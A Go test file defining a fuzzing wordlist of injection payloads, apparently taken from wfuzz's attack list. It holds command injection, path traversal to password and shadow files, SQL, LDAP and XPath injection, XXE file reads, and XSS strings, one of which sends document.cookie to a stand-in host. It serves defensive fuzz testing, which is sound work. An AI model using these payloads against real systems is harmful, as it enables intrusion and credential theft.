package wefttest

// FuzzValues for use with Fuzz* methods.
// From https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/All_attack.txt
var FuzzValues = []string{
	`0xfffffff`,
	`NULL`,
	`null`,
	`\0`,
	`\00`,
	`<  script > < / script>`,
	`%0a`,
	`%00`,
	`+%00`,
	`\0`,
	`\0\0`,
	`\0\0\0`,
	`\00`,
	`\00\00`,
	`\00\00\00`,
	`$null`,
	`$NULL`,
	`id`,
	`dir`,
	`;id;`,
	`;read;`,
	`;netstat -a;`,
	`\"blah`,
	`|id|`,
	`&quot;;id&quot;`,
	`id%00`,
	`id%00|`,
	`|id`,
	`|dir`,
	`|dir|`,
	`|ls`,
	`|ls -la`,
	`;ls -la`,
	`;dir`,
	`|/bin/ls -al`,
	`\n/bin/ls -al\n`,
	`?x=`,
	`?x="`,
	`?x=|`,
	`?x=>`,
	`/index.html|id|`,
	`/boot.ini`,
	`/etc/passwd`,
	`/etc/shadow`,
	`../../../../../../../../../../../../etc/hosts%00`,
	`../../../../../../../../../../../../etc/hosts`,
	`../../boot.ini`,
	`/../../../../../../../../%2A`,
	`../../../../../../../../../../../../etc/passwd%00`,
	`../../../../../../../../../../../../etc/passwd`,
	`../../../../../../../../../../../../etc/shadow%00`,
	`../../../../../../../../../../../../etc/shadow`,
	`/../../../../../../../../../../etc/passwd^^`,
	`/../../../../../../../../../../etc/shadow^^`,
	`/../../../../../../../../../../etc/passwd`,
	`/../../../../../../../../../../etc/shadow`,
	`/./././././././././././etc/passwd`,
	`/./././././././././././etc/shadow`,
	`\..\..\..\..\..\..\..\..\..\..\etc\passwd`,
	`\..\..\..\..\..\..\..\..\..\..\etc\shadow`,
	`..\..\..\..\..\..\..\..\..\..\etc\passwd`,
	`..\..\..\..\..\..\..\..\..\..\etc\shadow`,
	`/..\../..\../..\../..\../..\../..\../etc/passwd`,
	`/..\../..\../..\../..\../..\../..\../etc/shadow`,
	`.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd`,
	`.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow`,
	`\..\..\..\..\..\..\..\..\..\..\etc\passwd%00`,
	`\..\..\..\..\..\..\..\..\..\..\etc\shadow%00`,
	`..\..\..\..\..\..\..\..\..\..\etc\passwd%00`,
	`..\..\..\..\..\..\..\..\..\..\etc\shadow%00`,
	`%0a/bin/cat%20/etc/passwd`,
	`%0a/bin/cat%20/etc/shadow`,
	`%00/etc/passwd%00`,
	`%00/etc/shadow%00`,
	`%00../../../../../../etc/passwd`,
	`%00../../../../../../etc/shadow`,
	`/../../../../../../../../../../../etc/passwd%00.jpg`,
	`/../../../../../../../../../../../etc/passwd%00.html`,
	`/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd`,
	`/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow`,
	`/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`,
	`/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow`,
	`%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00`,
	`/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00`,
	`%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00`,
	`%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini`,
	`/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini`,
	`\\&apos;/bin/cat%20/etc/passwd\\&apos;`,
	`\\&apos;/bin/cat%20/etc/shadow\\&apos;`,
	`../../../../../../../../conf/server.xml`,
	`/../../../../../../../../bin/id|`,
	`C:/inetpub/wwwroot/global.asa`,
	`C:\inetpub\wwwroot\global.asa`,
	`C:/boot.ini`,
	`C:\boot.ini`,
	`../../../../../../../../../../../../localstart.asp%00`,
	`../../../../../../../../../../../../localstart.asp`,
	`../../../../../../../../../../../../boot.ini%00`,
	`../../../../../../../../../../../../boot.ini`,
	`/./././././././././././boot.ini`,
	`/../../../../../../../../../../../boot.ini%00`,
	`/../../../../../../../../../../../boot.ini`,
	`/..\../..\../..\../..\../..\../..\../boot.ini`,
	`/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini`,
	`\..\..\..\..\..\..\..\..\..\..\boot.ini`,
	`..\..\..\..\..\..\..\..\..\..\boot.ini%00`,
	`..\..\..\..\..\..\..\..\..\..\boot.ini`,
	`/../../../../../../../../../../../boot.ini%00.html`,
	`/../../../../../../../../../../../boot.ini%00.jpg`,
	`/.../.../.../.../.../`,
	`..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini`,
	`/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini`,
	`%0d%0aX-Injection-Header:%20AttackValue`,
	`!@#0%^#0##018387@#0^^**(()`,
	`%01%02%03%04%0a%0d%0aADSF`,
	`/,%ENV,/`,
	`&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;`,
	`&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;`,
	//`%`,
	`#`,
	`*`,
	`}`,
	`;`,
	`/`,
	`\`,
	`\\`,
	`\\/`,
	`\\\\*`,
	`\\\\?\\`,
	`&lt`,
	`&lt;`,
	`&LT`,
	`&LT;`,
	`<`,
	`<<`,
	`<<<`,
	`|`,
	`||`,
	`-`,
	`--`,
	`*|`,
	`^'`,
	`\'`,
	`/'`,
	`@'`,
	`(')`,
	`{'}`,
	`[']`,
	`*'`,
	`#'`,
	`!'`,
	`!@#$%%^#$%#$@#$%$$@#$%^^**(()`,
	`%01%02%03%04%0a%0d%0aADSF`,
	`\t`,
	`"\t"`,
	`&#10;`,
	`&#13;`,
	`&#10;&#13;`,
	`&#13;&#10;`,
	`#xD`,
	`#xA`,
	`#xD#xA`,
	`#xA#xD`,
	`/%00/`,
	`%00/`,
	`%00`,
	`<?`,
	`%3C`,
	`%3C%3F`,
	`%60`,
	`%5C`,
	`%5C/`,
	`%7C`,
	`%00`,
	`/%2A`,
	`%2A`,
	`%2C`,
	`%20`,
	`%20|`,
	`%250a`,
	`%2500`,
	`../`,
	`%2e%2e%2f`,
	`..%u2215`,
	`..%c0%af`,
	`..%bg%qf`,
	`..\`,
	`..%5c`,
	`..%%35c`,
	`..%255c`,
	`..%%35%63`,
	`..%25%35%63`,
	`..%u2216`,
	`&#60`,
	`&#060`,
	`&#0060`,
	`&#00060`,
	`&#000060`,
	`&#0000060`,
	`&#60;`,
	`&#060;`,
	`&#0060;`,
	`&#00060;`,
	`&#000060;`,
	`&#0000060;`,
	`&#x3c`,
	`&#x03c`,
	`&#x003c`,
	`&#x0003c`,
	`&#x00003c`,
	`&#x000003c`,
	`&#x3c;`,
	`&#x03c;`,
	`&#x003c;`,
	`&#x0003c;`,
	`&#x00003c;`,
	`&#x000003c;`,
	`&#X3c`,
	`&#X03c`,
	`&#X003c`,
	`&#X0003c`,
	`&#X00003c`,
	`&#X000003c`,
	`&#X3c;`,
	`&#X03c;`,
	`&#X003c;`,
	`&#X0003c;`,
	`&#X00003c;`,
	`&#X000003c;`,
	`&#x3C`,
	`&#x03C`,
	`&#x003C`,
	`&#x0003C`,
	`&#x00003C`,
	`&#x000003C`,
	`&#x3C;`,
	`&#x03C;`,
	`&#x003C;`,
	`&#x0003C;`,
	`&#x00003C;`,
	`&#x000003C;`,
	`&#X3C`,
	`&#X03C`,
	`&#X003C`,
	`&#X0003C`,
	`&#X00003C`,
	`&#X000003C`,
	`&#X3C;`,
	`&#X03C;`,
	`&#X003C;`,
	`&#X0003C;`,
	`&#X00003C;`,
	`&#X000003C;`,
	`\x3c`,
	`\x3C`,
	`\u003c`,
	`\u003C`,
	`something%00html`,
	`&apos;`,
	`/&apos;`,
	`\&apos;`,
	`^&apos;`,
	`@&apos;`,
	`{&apos;}`,
	`[&apos;]`,
	`*&apos;`,
	`#&apos;`,
	`">xxx<P>yyy`,
	`"><script>"`,
	`<script>alert("XSS")</script>`,
	`<<script>alert("XSS");//<</script>`,
	`<script>alert(document.cookie)</script>`,
	`'><script>alert(document.cookie)</script>`,
	`'><script>alert(document.cookie);</script>`,
	`\";alert('XSS');//`,
	`%3cscript%3ealert("XSS");%3c/script%3e`,
	`%3cscript%3ealert(document.cookie);%3c%2fscript%3e`,
	`%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E`,
	`&ltscript&gtalert(document.cookie);</script>`,
	`&ltscript&gtalert(document.cookie);&ltscript&gtalert`,
	`<xss><script>alert('XSS')</script></vulnerable>`,
	`<IMG%20SRC='javascript:alert(document.cookie)'>`,
	`<IMG SRC="javascript:alert('XSS');">`,
	`<IMG SRC="javascript:alert('XSS')"`,
	`<IMG SRC=javascript:alert('XSS')>`,
	`<IMG SRC=JaVaScRiPt:alert('XSS')>`,
	`<IMG SRC=javascript:alert(&quot;XSS&quot;)>`,
	"<IMG SRC=`javascript:alert(\"'XSS'\")`>",
	`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
	`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
	`<IMG%20SRC='javasc	ript:alert(document.cookie)'>`,
	`<IMG SRC="jav	ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
	`<IMG SRC=" &#14;  javascript:alert('XSS');">`,
	`<IMG DYNSRC="javascript:alert('XSS')">`,
	`<IMG LOWSRC="javascript:alert('XSS')">`,
	`<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>`,
	`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
	`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
	`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
	`'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E`,
	`"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>`,
	`%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E`,
	`';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}`,
	`'';!--"<XSS>=&{()}`,
	``,
	`'`,
	`"`,
	`#`,
	`-`,
	`--`,
	`' --`,
	`--';`,
	`' ;`,
	`= '`,
	`= ;`,
	`= --`,
	`\x23`,
	`\x27`,
	`\x3D \x3B'`,
	`\x3D \x27`,
	`\x27\x4F\x52 SELECT *`,
	`\x27\x6F\x72 SELECT *`,
	`'or select *`,
	`admin'--`,
	`<>"'%;)(&+`,
	`' or ''='`,
	`' or 'x'='x`,
	`" or "x"="x`,
	`') or ('x'='x`,
	`0 or 1=1`,
	`' or 0=0 --`,
	`" or 0=0 --`,
	`or 0=0 --`,
	`' or 0=0 #`,
	`" or 0=0 #`,
	`or 0=0 #`,
	`' or 1=1--`,
	`" or 1=1--`,
	`' or '1'='1'--`,
	`"' or 1 --'"`,
	`or 1=1--`,
	`or%201=1`,
	`or%201=1 --`,
	`' or 1=1 or ''='`,
	`" or 1=1 or ""="`,
	`' or a=a--`,
	`" or "a"="a`,
	`') or ('a'='a`,
	`") or ("a"="a`,
	`hi" or "a"="a`,
	`hi" or 1=1 --`,
	`hi' or 1=1 --`,
	`hi' or 'a'='a`,
	`hi') or ('a'='a`,
	`hi") or ("a"="a`,
	`'hi' or 'x'='x';`,
	`@variable`,
	`,@variable`,
	`PRINT`,
	`PRINT @@variable`,
	`select`,
	`insert`,
	`as`,
	`or`,
	`procedure`,
	`limit`,
	`order by`,
	`asc`,
	`desc`,
	`delete`,
	`update`,
	`distinct`,
	`having`,
	`truncate`,
	`replace`,
	`like`,
	`handler`,
	`bfilename`,
	`' or username like '%`,
	`' or uname like '%`,
	`' or userid like '%`,
	`' or uid like '%`,
	`' or user like '%`,
	`exec xp`,
	`exec sp`,
	`'; exec master..xp_cmdshell`,
	`'; exec xp_regread`,
	`t'exec master..xp_cmdshell 'nslookup www.google.com'--`,
	`--sp_password`,
	`\x27UNION SELECT`,
	`' UNION SELECT`,
	`' UNION ALL SELECT`,
	`' or (EXISTS)`,
	`' (select top 1`,
	`'||UTL_HTTP.REQUEST`,
	`1;SELECT%20*`,
	`to_timestamp_tz`,
	`tz_offset`,
	`&lt;&gt;&quot;'%;)(&amp;+`,
	`'%20or%201=1`,
	`%27%20or%201=1`,
	`%20$(sleep%2050)`,
	`%20'sleep%2050'`,
	`char%4039%41%2b%40SELECT`,
	`&apos;%20OR`,
	`'sqlattempt1`,
	`(sqlattempt2)`,
	`|`,
	`%7C`,
	`*|`,
	`%2A%7C`,
	`*(|(mail=*))`,
	`%2A%28%7C%28mail%3D%2A%29%29`,
	`*(|(objectclass=*))`,
	`%2A%28%7C%28objectclass%3D%2A%29%29`,
	`(`,
	`%28`,
	`)`,
	`%29`,
	`&`,
	`%26`,
	`!`,
	`%21`,
	`' or 1=1 or ''='`,
	`' or ''='`,
	`x' or 1=1 or 'x'='y`,
	`/`,
	`//`,
	`//*`,
	`*/*`,
	`@*`,
	`count(/child::node())`,
	`x' or name()='username' or 'x'='y`,
	`<name>','')); phpinfo(); exit;/*</name>`,
	`<![CDATA[<script>var n=0;while(true){n++;}</script>]]>`,
	`<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>`,
	`<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>`,
	`<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
	`<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
	`<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>`,
	` `,
}
